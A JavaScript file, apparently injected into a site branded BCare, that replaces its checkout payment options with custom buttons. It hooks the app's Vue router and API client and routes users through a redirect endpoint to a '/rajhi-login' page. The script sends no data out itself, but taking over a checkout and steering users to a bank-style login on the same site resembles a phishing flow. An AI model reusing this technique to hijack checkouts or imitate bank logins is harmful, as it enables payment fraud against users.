/* =============================================================================
 * BCare — Payment Selector (injected script)
 * -----------------------------------------------------------------------------
 * Replaces the payment-method radios on OfferSummaryPage with three buttons:
 *   1. الدفع بالبطاقة          → page's own "متابعة الدفع" (continue → /credit-card-payment)
 *   2. Apple Pay               → disabled (toast)
 *   3. الدفع السريع عبر الراجحي → POST /payments/rajhi-redirect → /rajhi-login
 *
 * The app's router only lets a visitor onto the route the server allows, so
 * every button goes through the server first: the card button triggers the
 * page's hidden proceed button, and the Rajhi button calls rajhi-redirect via
 * the app's own API client (same tokens/headers) and then follows the signed
 * route it returns.
 * ===========================================================================*/
(function () {
  "use strict";

  var PATCHED = "data-pay-sel";
  var TARGET_ROUTE = "/credit-card-payment";
  var pendingMethod = null;
  var guardInstalled = false;

  var STYLE_ID = "bcare-pay-sel-style";
  if (!document.getElementById(STYLE_ID)) {
    var st = document.createElement("style");
    st.id = STYLE_ID;
    st.textContent =
      ".cps-wrap{display:flex;flex-direction:column;gap:12px;margin:4px 0 0}" +
      ".cps-btn{position:relative;width:100%;min-height:56px;padding:0 18px;display:flex;align-items:center;" +
      "justify-content:space-between;gap:12px;border-radius:12px;font-family:Cairo,inherit,sans-serif;" +
      "font-size:16px;font-weight:700;direction:rtl;cursor:pointer;box-sizing:border-box;" +
      "transition:transform .12s ease,box-shadow .18s ease,background .18s ease,border-color .18s ease}" +
      ".cps-btn:active{transform:scale(.985)}" +
      ".cps-btn[disabled]{cursor:default}" +
      ".cps-label{display:flex;align-items:center;gap:10px;white-space:nowrap}" +
      ".cps-ico{width:22px;height:22px;flex:none}" +
      ".cps-logos{display:flex;align-items:center;gap:6px;flex:none}" +
      ".cps-logos img{height:24px;width:auto;border-radius:4px;background:#fff;display:block}" +
      ".cps-card{background:#1a3c5e;color:#fff;border:none;box-shadow:0 4px 12px rgba(26,60,94,.22)}" +
      ".cps-card:hover:not([disabled]){background:#15324f;box-shadow:0 6px 16px rgba(26,60,94,.3)}" +
      ".cps-apple{background:#000;color:#fff;border:none;justify-content:center;opacity:.45;cursor:not-allowed}" +
      ".cps-apple .cps-label{font-size:18px;font-weight:600;gap:4px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}" +
      ".cps-apple .cps-ico{width:18px;height:18px}" +
      ".cps-badge{position:absolute;left:12px;top:50%;transform:translateY(-50%);font-size:11px;font-weight:700;" +
      "font-family:Cairo,sans-serif;background:rgba(255,255,255,.18);color:#fff;padding:3px 9px;border-radius:99px}" +
      ".cps-rajhi{background:#fff;color:#1a3c5e;border:1.5px solid #dfe3f0;box-shadow:0 2px 8px rgba(17,24,39,.05)}" +
      ".cps-rajhi:hover:not([disabled]){border-color:#2f2fe6;box-shadow:0 4px 12px rgba(47,47,230,.12)}" +
      ".cps-rajhi .cps-ico{width:26px;height:26px;object-fit:contain}" +
      ".cps-busy{opacity:.75}" +
      ".cps-spin{width:18px;height:18px;border:2.5px solid currentColor;border-right-color:transparent;" +
      "border-radius:50%;animation:cps-rot .7s linear infinite;flex:none}" +
      "@keyframes cps-rot{to{transform:rotate(360deg)}}" +
      ".cps-toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%);background:#1a1a2e;color:#fff;" +
      "padding:12px 26px;border-radius:12px;z-index:9999;font-size:14px;font-family:Cairo,sans-serif;" +
      "direction:rtl;pointer-events:none;animation:cps-fadein .2s ease}" +
      "@keyframes cps-fadein{from{opacity:0;bottom:18px}to{opacity:1;bottom:28px}}";
    document.head.appendChild(st);
  }

  var ICON_CARD =
    '<svg class="cps-ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" ' +
    'stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2.5"/>' +
    '<line x1="2" y1="10" x2="22" y2="10"/><line x1="6" y1="15" x2="10" y2="15"/></svg>';
  var ICON_APPLE =
    '<svg class="cps-ico" viewBox="0 0 384 512" fill="currentColor"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 ' +
    '50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 ' +
    '184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 ' +
    '76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 ' +
    '24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/></svg>';

  function getRouter() {
    try {
      var app = document.getElementById("app");
      return app && app.__vue_app__ && app.__vue_app__.config.globalProperties.$router;
    } catch (e) { return null; }
  }

  function installGuard() {
    if (guardInstalled) return;
    var router = getRouter();
    if (!router || typeof router.beforeEach !== "function") return;
    router.beforeEach(function (to) {
      if (pendingMethod && to && to.path === TARGET_ROUTE) {
        try { localStorage.setItem("selectedPaymentMethod", pendingMethod); } catch (e) {}
        pendingMethod = null;
      }
    });
    guardInstalled = true;
  }

  function showToast(msg) {
    var prev = document.querySelector(".cps-toast");
    if (prev) prev.remove();
    var el = document.createElement("div");
    el.className = "cps-toast";
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(function () { el.remove(); }, 3000);
  }

  function setBusy(wrap, btn, busy) {
    var buttons = wrap.querySelectorAll(".cps-btn");
    for (var i = 0; i < buttons.length; i++) {
      if (!buttons[i].classList.contains("cps-apple")) buttons[i].disabled = busy;
    }
    if (busy) {
      btn.classList.add("cps-busy");
      btn.setAttribute("data-label", btn.innerHTML);
      btn.innerHTML = '<span class="cps-label"><span class="cps-spin"></span>جارٍ المعالجة...</span>';
      btn.style.justifyContent = "center";
    } else if (btn.hasAttribute("data-label")) {
      btn.innerHTML = btn.getAttribute("data-label");
      btn.removeAttribute("data-label");
      btn.classList.remove("cps-busy");
      btn.style.justifyContent = "";
    }
  }

  function proceed(section, wrap, btn, method) {
    var orig = section.querySelector(".proceed-btn:not([data-cps])");
    if (!orig || orig.disabled) return;
    installGuard();
    pendingMethod = method;
    setBusy(wrap, btn, true);
    orig.click();
    // Restore immediately if the route changes or the hidden button re-enables, with 10s max fallback.
    var startedAt = Date.now();
    var poll = setInterval(function () {
      var gone = !document.body.contains(wrap) || window.location.pathname !== "/offer-summary";
      var doneWaiting = orig && !orig.disabled && (Date.now() - startedAt) > 350;
      var timedOut = (Date.now() - startedAt) >= 10000;
      if (gone || doneWaiting || timedOut) {
        clearInterval(poll);
        if (document.body.contains(wrap)) {
          pendingMethod = null;
          setBusy(wrap, btn, false);
        }
      }
    }, 150);
  }

  // The app's bundle exports its API client (O), getSessionId (L) and router
  // (aa). Import the exact URL the page already loaded so we get the same
  // module instance instead of booting a second copy of the app.
  var APP_MODULE_RE = /\/assets\/main-06cbb95e1324bc55\.gateway[^/]*\.js/;
  var appModulePromise = null;
  function loadAppModule() {
    if (appModulePromise) return appModulePromise;
    var url = null;
    try {
      var entries = performance.getEntriesByType("resource");
      for (var i = 0; i < entries.length; i++) {
        if (APP_MODULE_RE.test(entries[i].name)) { url = entries[i].name; break; }
      }
    } catch (e) {}
    if (!url) return Promise.reject(new Error("app module not found"));
    appModulePromise = import(url);
    return appModulePromise;
  }

  function goRajhi(wrap, btn) {
    setBusy(wrap, btn, true);
    loadAppModule().then(function (m) {
      var api = m.O;
      var getSessionId = m.L;
      var router = m.aa || getRouter();
      var sid = typeof getSessionId === "function" ? getSessionId() : null;
      if (!api || typeof api.post !== "function" || !sid || !router) throw new Error("app not ready");
      try { localStorage.setItem("selectedPaymentMethod", "rajhi"); } catch (e) {}
      return api.post("/payments/rajhi-redirect", { session_id: sid }).then(function (res) {
        var target = (res && (res.signed_route || (res.data && res.data.signed_route))) || "/rajhi-login";
        return router.push(target);
      });
    }).catch(function () {
      setBusy(wrap, btn, false);
      showToast("تعذّر التحويل إلى الراجحي، يرجى المحاولة مرة أخرى");
    });
    setTimeout(function () {
      if (document.body.contains(wrap) && btn.classList.contains("cps-busy")) setBusy(wrap, btn, false);
    }, 15000);
  }

  function makeButton(cls, html) {
    var b = document.createElement("button");
    b.type = "button";
    b.setAttribute("data-cps", "1");
    b.className = "cps-btn " + cls;
    b.innerHTML = html;
    return b;
  }

  function patch(section) {
    if (section.hasAttribute(PATCHED)) return;
    section.setAttribute(PATCHED, "1");

    var orig = section.querySelector(".proceed-btn:not([data-cps])");
    if (orig) orig.style.display = "none";

    var wrap = document.createElement("div");
    wrap.className = "cps-wrap";

    var cardBtn = makeButton("cps-card",
      '<span class="cps-label">' + ICON_CARD + "الدفع بالبطاقة</span>" +
      '<span class="cps-logos">' +
      '<img src="/assets/images/client/mada-card.svg" alt="mada">' +
      '<img src="/assets/images/client/visa-card.svg" alt="Visa">' +
      '<img src="/assets/images/client/master-card.svg" alt="Mastercard">' +
      "</span>");
    cardBtn.addEventListener("click", function () { proceed(section, wrap, cardBtn, "credit-card"); });

    var appleBtn = makeButton("cps-apple",
      '<span class="cps-label">' + ICON_APPLE + "Pay</span>" +
      '<span class="cps-badge">غير متاح حالياً</span>');
    appleBtn.setAttribute("aria-disabled", "true");
    appleBtn.addEventListener("click", function () { showToast("خدمة Apple Pay غير متاحة حالياً"); });

    wrap.appendChild(cardBtn);
    wrap.appendChild(appleBtn);

    var back = section.querySelector(".back-btn");
    if (back) section.insertBefore(wrap, back);
    else section.appendChild(wrap);
  }

  function run() {
    var section = document.querySelector(".payment-section:not([" + PATCHED + "])");
    if (section) patch(section);
  }

  var timer = null;
  new MutationObserver(function () {
    clearTimeout(timer);
    timer = setTimeout(run, 100);
  }).observe(document.documentElement, { childList: true, subtree: true });

  setTimeout(run, 400);
  setTimeout(run, 900);
  setTimeout(run, 1800);
})();
